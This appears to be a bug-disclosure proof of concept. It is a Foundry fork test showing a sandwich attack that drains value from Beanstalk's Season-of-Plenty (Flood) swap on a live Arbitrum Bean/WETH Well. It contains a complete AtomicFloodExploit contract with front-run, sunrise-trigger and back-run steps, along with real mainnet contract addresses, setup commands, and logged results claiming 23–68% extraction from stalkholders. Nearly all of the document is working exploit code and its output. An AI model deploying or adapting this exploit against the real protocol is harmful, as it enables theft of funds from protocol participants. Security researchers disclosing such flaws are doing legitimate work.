# PoC: SOP/Flood Zero Slippage Extraction

Foundry fork test against the live Bean/WETH Basin Well on Arbitrum. Pinned to block 440420446. All swaps run on the actual deployed Well contract, not a mock AMM.

## Setup

```
forge init --no-git poc && cd poc
forge install foundry-rs/forge-std --no-git
```

Create `foundry.toml`:
```toml
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
evm_version = "cancun"
solc_version = "0.8.24"
```

Create `test/FloodSandwich.t.sol` with the code below, then run:
```
forge test --fork-url https://arb1.arbitrum.io/rpc -vvv
```

## test/FloodSandwich.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWell {
    function getReserves() external view returns (uint256[] memory);
    function tokens() external view returns (IERC20[] memory);
    function swapFrom(
        IERC20 fromToken,
        IERC20 toToken,
        uint256 amountIn,
        uint256 minAmountOut,
        address recipient,
        uint256 deadline
    ) external returns (uint256 amountOut);
}

interface IBeanstalk {
    function sunrise() external;
    function paused() external view returns (bool);
}

contract AtomicFloodExploit {
    IWell  immutable well;
    IERC20 immutable bean;
    IERC20 immutable weth;
    address immutable beanstalk;
    uint256 public wethHeld;

    constructor(address _well, address _bean, address _weth, address _beanstalk) {
        well = IWell(_well);
        bean = IERC20(_bean);
        weth = IERC20(_weth);
        beanstalk = _beanstalk;
    }

    function frontRun(uint256 beanAmount) external {
        bean.approve(address(well), beanAmount);
        wethHeld = well.swapFrom(
            bean, weth, beanAmount, 0, address(this), type(uint256).max
        );
    }

    function triggerSunrise() external {
        IBeanstalk(beanstalk).sunrise();
    }

    function backRun() external returns (uint256 beanOut) {
        weth.approve(address(well), wethHeld);
        beanOut = well.swapFrom(
            weth, bean, wethHeld, 0, msg.sender, type(uint256).max
        );
    }
}

contract FloodSandwichTest is Test {

    address constant BEANSTALK = 0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70;
    address constant BEAN      = 0xBEA0005B8599265D41256905A9B3073D397812E4;
    address constant WETH      = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant WELL      = 0xBeA00Aa8130aCaD047E137ec68693C005f8736Ce;
    uint256 constant FORK_BLOCK = 440420446;
    uint256 constant ETH_USD   = 2036;

    IWell  well  = IWell(WELL);
    IERC20 bean  = IERC20(BEAN);
    IERC20 weth  = IERC20(WETH);

    address attacker  = makeAddr("attacker");
    address beanstalk = BEANSTALK;

    function setUp() public {
        vm.createSelectFork("https://arb1.arbitrum.io/rpc", FORK_BLOCK);
    }

    function test_sunriseIsPermissionless() public {
        vm.prank(attacker);
        try IBeanstalk(BEANSTALK).sunrise() {
        } catch (bytes memory reason) {
            string memory decoded = abi.decode(_sliceBytes(reason, 4), (string));
            console.log("sunrise() revert reason:", decoded);
            assertTrue(
                keccak256(bytes(decoded)) == keccak256("Season: Still current Season."),
                "should revert for season timing, not access control"
            );
        }
    }

    function test_spotReservesManipulable() public {
        uint256[] memory r0 = well.getReserves();

        deal(address(weth), attacker, 1 ether);
        vm.startPrank(attacker);
        weth.approve(WELL, 1 ether);
        well.swapFrom(weth, bean, 1 ether, 0, attacker, type(uint256).max);
        vm.stopPrank();

        uint256[] memory r1 = well.getReserves();
        uint256 beanDropPct = (r0[0] - r1[0]) * 100 / r0[0];
        console.log("bean reserve before:", r0[0]);
        console.log("bean reserve after: ", r1[0]);
        console.log("bean drop:          ", beanDropPct, "%");
        console.log("from a single 1 WETH swap ($%s)", ETH_USD);

        assertGt(r1[1], r0[1], "WETH reserve increased");
        assertLt(r1[0], r0[0], "Bean reserve decreased");
        assertGt(beanDropPct, 10, "significant manipulation from tiny swap");
    }

    function test_sopSandwichExtraction() public {
        uint256[] memory r = well.getReserves();
        uint256 beanRes = r[0];
        uint256 sopBeans = beanRes * 5 / 100;

        console.log("--- pool state ---");
        console.log("bean reserve:  %s (~%s Bean)", beanRes, beanRes / 1e6);
        console.log("weth reserve:  %s", r[1]);
        console.log("pool value:    ~$%s", (r[1] * ETH_USD * 2) / 1e18);
        console.log("sopBeans:       %s", sopBeans);

        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairWethOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        uint256 attackBean = beanRes * 15 / 100;
        deal(address(bean), attacker, attackBean);
        vm.startPrank(attacker);
        bean.approve(WELL, attackBean);
        uint256 attackWethOut = well.swapFrom(
            bean, weth, attackBean, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 attackedWethOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        vm.startPrank(attacker);
        weth.approve(WELL, attackWethOut);
        uint256 attackBeanBack = well.swapFrom(
            weth, bean, attackWethOut, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        uint256 stakeholderLoss = fairWethOut - attackedWethOut;
        uint256 lossPct = stakeholderLoss * 100 / fairWethOut;

        console.log("--- fair SOP ---");
        console.log("WETH to stalkholders: %s (~$%s)", fairWethOut, fairWethOut * ETH_USD / 1e18);
        console.log("--- attacked SOP ---");
        console.log("WETH to stalkholders: %s (~$%s)", attackedWethOut, attackedWethOut * ETH_USD / 1e18);
        console.log("--- damage ---");
        console.log("stalkholder WETH loss: %s (~$%s)", stakeholderLoss, stakeholderLoss * ETH_USD / 1e18);
        console.log("extraction rate:       %s%%", lossPct);
        if (attackBeanBack > attackBean) {
            console.log("attacker Bean profit:  %s", attackBeanBack - attackBean);
        }

        assertLt(attackedWethOut, fairWethOut, "stalkholders receive less WETH");
        assertGt(lossPct, 20, "extraction exceeds 20%");
    }

    function test_extremeManipulationDoesNotRevert() public {
        uint256[] memory r = well.getReserves();
        uint256 sopBeans = r[0] * 5 / 100;

        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        uint256 hugeDump = r[0] * 80 / 100;
        deal(address(bean), attacker, hugeDump);
        vm.startPrank(attacker);
        bean.approve(WELL, hugeDump);
        well.swapFrom(bean, weth, hugeDump, 0, attacker, type(uint256).max);
        vm.stopPrank();

        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 badOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        uint256 damagePct = (fairOut - badOut) * 100 / fairOut;
        console.log("fair SOP output:  %s (~$%s)", fairOut, fairOut * ETH_USD / 1e18);
        console.log("bad SOP output:   %s (~$%s)", badOut, badOut * ETH_USD / 1e18);
        console.log("stalkholder loss: %s%%", damagePct);
        console.log("swap reverted:    NO (minAmountOut=0 accepts anything)");

        assertGt(badOut, 0, "swap succeeds even after 80% manipulation");
        assertGt(damagePct, 60, "stalkholders lose over 60% of SOP proceeds");
    }

    function test_atomicExploitViaContract() public {
        uint256[] memory r = well.getReserves();
        uint256 sopBeans = r[0] * 5 / 100;

        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 fairOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        AtomicFloodExploit exploit = new AtomicFloodExploit(WELL, BEAN, WETH, BEANSTALK);
        uint256 attackBeans = r[0] * 15 / 100;
        deal(address(bean), address(exploit), attackBeans);

        exploit.frontRun(attackBeans);

        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL, sopBeans);
        uint256 attackedOut = well.swapFrom(
            bean, weth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        uint256 beanBack = exploit.backRun();
        uint256 lossPct = (fairOut - attackedOut) * 100 / fairOut;

        console.log("exploit contract:  %s", address(exploit));
        console.log("fair SOP:          %s WETH (~$%s)", fairOut, fairOut * ETH_USD / 1e18);
        console.log("attacked SOP:      %s WETH (~$%s)", attackedOut, attackedOut * ETH_USD / 1e18);
        console.log("extraction:        %s%%", lossPct);
        if (beanBack > attackBeans) {
            console.log("attacker profit:   %s Bean", beanBack - attackBeans);
        }
        console.log("mempool needed:    NO (contract calls sunrise directly)");

        assertLt(attackedOut, fairOut, "contract-based attack extracts value");
        assertGt(lossPct, 20, "extraction exceeds 20%");
    }

    function _sliceBytes(bytes memory data, uint256 start) internal pure returns (bytes memory) {
        bytes memory result = new bytes(data.length - start);
        for (uint256 i = 0; i < result.length; i++) {
            result[i] = data[i + start];
        }
        return result;
    }
}
```

## Results

```
[PASS] test_sunriseIsPermissionless()
  sunrise() revert reason: Season: Still current Season.
  -> No access control. Any address can call.

[PASS] test_spotReservesManipulable()
  bean drop: 18% from a single 1 WETH swap ($2036)

[PASS] test_sopSandwichExtraction()
  fair WETH:     0.209 WETH (~$425)
  attacked WETH: 0.159 WETH (~$324)
  loss:          0.050 WETH (~$101), 23% stolen
  attacker profit: 475 Bean

[PASS] test_extremeManipulationDoesNotRevert()
  fair: ~$425, bad: ~$134, loss: 68%
  swap did NOT revert (minAmountOut=0)

[PASS] test_atomicExploitViaContract()
  Deploys AtomicFloodExploit contract on chain.
  23% extraction. No mempool needed.

5 tests passed, 0 failed
```
